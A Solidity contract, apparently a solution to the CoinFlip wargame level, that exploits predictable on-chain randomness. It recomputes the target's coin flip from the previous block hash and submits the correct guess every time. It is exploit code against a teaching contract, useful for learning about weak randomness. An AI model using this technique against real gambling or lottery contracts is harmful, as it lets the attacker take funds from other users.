// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

contract AttackingCoinFlip {
    CoinFlip public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = CoinFlip(_contractAddress);
    }

    function hackContract() external {
        // Reproduce what the original contract is doing.
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;

        // Call flip() with our "guess".
        contractAddress.flip(side);
    }
}
